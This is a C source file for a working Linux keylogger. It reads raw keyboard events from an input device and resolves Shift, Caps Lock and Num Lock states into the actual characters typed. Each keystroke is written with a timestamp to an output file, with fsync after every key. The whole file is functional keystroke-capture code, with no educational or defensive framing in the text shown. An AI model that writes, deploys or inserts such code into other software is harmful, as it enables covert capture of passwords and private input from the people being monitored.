#include "keylogger.h"

const char *KeyCodeToString(unsigned short code)
{
    switch (code)
    {
    // Number keys
    case KEY_1:
        return "1";
    case KEY_2:
        return "2";
    case KEY_3:
        return "3";
    case KEY_4:
        return "4";
    case KEY_5:
        return "5";
    case KEY_6:
        return "6";
    case KEY_7:
        return "7";
    case KEY_8:
        return "8";
    case KEY_9:
        return "9";
    case KEY_0:
        return "0";

    // Letters
    case KEY_A:
        return "a";
    case KEY_B:
        return "b";
    case KEY_C:
        return "c";
    case KEY_D:
        return "d";
    case KEY_E:
        return "e";
    case KEY_F:
        return "f";
    case KEY_G:
        return "g";
    case KEY_H:
        return "h";
    case KEY_I:
        return "i";
    case KEY_J:
        return "j";
    case KEY_K:
        return "k";
    case KEY_L:
        return "l";
    case KEY_M:
        return "m";
    case KEY_N:
        return "n";
    case KEY_O:
        return "o";
    case KEY_P:
        return "p";
    case KEY_Q:
        return "q";
    case KEY_R:
        return "r";
    case KEY_S:
        return "s";
    case KEY_T:
        return "t";
    case KEY_U:
        return "u";
    case KEY_V:
        return "v";
    case KEY_W:
        return "w";
    case KEY_X:
        return "x";
    case KEY_Y:
        return "y";
    case KEY_Z:
        return "z";

    // Symbols and punctuation
    case KEY_MINUS:
        return "-";
    case KEY_EQUAL:
        return "=";
    case KEY_LEFTBRACE:
        return "[";
    case KEY_RIGHTBRACE:
        return "]";
    case KEY_BACKSLASH:
        return "\\";
    case KEY_SEMICOLON:
        return ";";
    case KEY_APOSTROPHE:
        return "'";
    case KEY_GRAVE:
        return "`";
    case KEY_COMMA:
        return ",";
    case KEY_DOT:
        return ".";
    case KEY_SLASH:
        return "/";

    // Space and control keys
    case KEY_SPACE:
        return "[SPACE]";
    case KEY_TAB:
        return "[TAB]";
    case KEY_ENTER:
        return "[ENTER]";
    case KEY_BACKSPACE:
        return "[BACKSPACE]";
    case KEY_ESC:
        return "[ESC]";
    case KEY_LEFTSHIFT:
        return "[LSHIFT]";
    case KEY_RIGHTSHIFT:
        return "[RSHIFT]";
    case KEY_LEFTCTRL:
        return "[LCTRL]";
    case KEY_RIGHTCTRL:
        return "[RCTRL]";
    case KEY_LEFTMETA:
        return "[LWIN]";
    case KEY_LEFTALT:
        return "[LALT]";
    case KEY_CAPSLOCK:
        return "[CAPSLOCK]";
    case KEY_NUMLOCK:
        return "[NUMLOCK]";
    case KEY_SCROLLLOCK:
        return "[SCROLLLOCK]";
    case KEY_DELETE:
        return "[DEL]";
    case KEY_INSERT:
        return "[INS]";
    case KEY_HOME:
        return "[HOME]";
    case KEY_END:
        return "[END]";
    case KEY_PAGEUP:
        return "[PGUP]";
    case KEY_PAGEDOWN:
        return "[PGDN]";
    case KEY_PRINT:
        return "[PRINT]";
    case KEY_PAUSE:
        return "[PAUSE]";
    case KEY_MENU:
        return "[MENU]";

    // Function keys
    case KEY_F1:
        return "[F1]";
    case KEY_F2:
        return "[F2]";
    case KEY_F3:
        return "[F3]";
    case KEY_F4:
        return "[F4]";
    case KEY_F5:
        return "[F5]";
    case KEY_F6:
        return "[F6]";
    case KEY_F7:
        return "[F7]";
    case KEY_F8:
        return "[F8]";
    case KEY_F9:
        return "[F9]";
    case KEY_F10:
        return "[F10]";
    case KEY_F11:
        return "[F11]";
    case KEY_F12:
        return "[F12]";

    // Numpad keys
    case KEY_KP0:
        return "KEY_KP0";
    case KEY_KP1:
        return "KEY_KP1";
    case KEY_KP2:
        return "KEY_KP2";
    case KEY_KP3:
        return "KEY_KP3";
    case KEY_KP4:
        return "KEY_KP4";
    case KEY_KP5:
        return "KEY_KP5";
    case KEY_KP6:
        return "KEY_KP6";
    case KEY_KP7:
        return "KEY_KP7";
    case KEY_KP8:
        return "KEY_KP8";
    case KEY_KP9:
        return "KEY_KP9";
    case KEY_KPDOT:
        return "KEY_KPDOT";
    case KEY_KPENTER:
        return "KEY_KPENTER";
    case KEY_KPSLASH:
        return "KEY_KPSLASH";
    case KEY_KPASTERISK:
        return "KEY_KPASTERISK";
    case KEY_KPMINUS:
        return "KEY_KPMINUS";
    case KEY_KPPLUS:
        return "KEY_KPPLUS";

    // arrows key
    case KEY_UP:
        return "[UP]";
    case KEY_DOWN:
        return "[DOWN]";
    case KEY_LEFT:
        return "[LEFT]";
    case KEY_RIGHT:
        return "[RIGHT]";

    default:
        return "[UNKNOWN]";
    }
}

char ShiftedChar(char c)
{
    switch (c)
    {
    case '1':
        return '!';
    case '2':
        return '@';
    case '3':
        return '#';
    case '4':
        return '$';
    case '5':
        return '%';
    case '6':
        return '^';
    case '7':
        return '&';
    case '8':
        return '*';
    case '9':
        return '(';
    case '0':
        return ')';
    case '-':
        return '_';
    case '=':
        return '+';
    case '[':
        return '{';
    case ']':
        return '}';
    case '\\':
        return '|';
    case ';':
        return ':';
    case '\'':
        return '"';
    case ',':
        return '<';
    case '.':
        return '>';
    case '/':
        return '?';
    case '`':
        return '~';
    default:
        return c;
    }
}

const char *numpadKey(int code, bool numLockOn)
{
    switch (code)
    {
    case KEY_KP0:
        return numLockOn ? "0" : "[INS]";
    case KEY_KP1:
        return numLockOn ? "1" : "[END]";
    case KEY_KP2:
        return numLockOn ? "2" : "[DOWN]";
    case KEY_KP3:
        return numLockOn ? "3" : "[PGDN]";
    case KEY_KP4:
        return numLockOn ? "4" : "[LEFT]";
    case KEY_KP5:
        return numLockOn ? "5" : "[5]";
    case KEY_KP6:
        return numLockOn ? "6" : "[RIGHT]";
    case KEY_KP7:
        return numLockOn ? "7" : "[HOME]";
    case KEY_KP8:
        return numLockOn ? "8" : "[UP]";
    case KEY_KP9:
        return numLockOn ? "9" : "[PGUP]";
    case KEY_KPDOT:
        return numLockOn ? "." : "[DEL]";
    case KEY_KPENTER:
        return "[ENTER]";
    case KEY_KPSLASH:
        return "/";
    case KEY_KPASTERISK:
        return "*";
    case KEY_KPMINUS:
        return "-";
    case KEY_KPPLUS:
        return "+";
    default:
        return "[KP?]";
    }
}

bool isKeypadKey(const char *keyName)
{
    return strstr(keyName, "KEY_KP");
}

int GetCapsLockState(int keyboard_fd)
{
    unsigned char leds[1] = {0};

    if (ioctl(keyboard_fd, EVIOCGLED(sizeof(leds)), leds) < 0)
    {
        perror("ioctl EVIOCGLED failed");
        return 0;
    }
    return (leds[0] & (1 << LED_CAPSL)) != 0;
}

int GetNumLockState(int keyboard_fd)
{
    unsigned char leds[1] = {0};
    if (ioctl(keyboard_fd, EVIOCGLED(sizeof(leds)), leds) < 0)
        return 0;
    return (leds[0] & (1 << LED_NUML)) != 0;
}

void keylogger(int keyboard, int writeout)
{
    struct input_event inputEvent;
    int shiftPressed = 0;
    int capsLockOn = GetCapsLockState(keyboard);
    int numLockOn = GetNumLockState(keyboard);

    while (!stopLogging)
    {
        ssize_t n = read(keyboard, &inputEvent, sizeof(inputEvent));
        if (n != (ssize_t)sizeof(inputEvent))
            continue;

        if (inputEvent.type != EV_KEY)
            continue;

        if (inputEvent.code == KEY_LEFTSHIFT || inputEvent.code == KEY_RIGHTSHIFT)
        {
            shiftPressed = (inputEvent.value != 0);
            continue;
        }

        if (inputEvent.code == KEY_CAPSLOCK && inputEvent.value == 1)
        {
            capsLockOn = !capsLockOn;
            continue;
        }

        if (inputEvent.code == KEY_NUMLOCK && inputEvent.value == 1)
        {
            numLockOn = !numLockOn;
            continue;
        }

        if (inputEvent.value != 1)
            continue;

        char buffer[128];
        time_t now = time(NULL);
        struct tm *t = localtime(&now);
        char timebuf[64];
        strftime(timebuf, sizeof(timebuf), "%Y-%m-%d %H:%M:%S", t);

        // map keycode to string
        const char *keyName = KeyCodeToString(inputEvent.code);

        if (isKeypadKey(keyName))
        {
            const char *val = numpadKey(inputEvent.code, numLockOn);
            snprintf(buffer, sizeof(buffer), "[%s]: %s\n", timebuf, val);
        }
        else if (strlen(keyName) == 1 && isalpha(keyName[0]))
        {
            // Handle letters (A–Z)
            char c = keyName[0];
            int upper = (shiftPressed ^ capsLockOn);
            c = upper ? toupper(c) : tolower(c);
            snprintf(buffer, sizeof(buffer), "[%s]: %c\n", timebuf, c);
        }
        else if (strlen(keyName) == 1 && (isdigit(keyName[0]) || ispunct(keyName[0])))
        {
            // Handle number row and punctuation
            char c = keyName[0];
            if (shiftPressed)
                c = ShiftedChar(c);
            snprintf(buffer, sizeof(buffer), "[%s]: %c\n", timebuf, c);
        }
        else
        {
            // Function keys, arrows, and others
            snprintf(buffer, sizeof(buffer), "[%s]: %s\n", timebuf, keyName);
        }

        write(writeout, buffer, strlen(buffer));
        fsync(writeout);
    }
}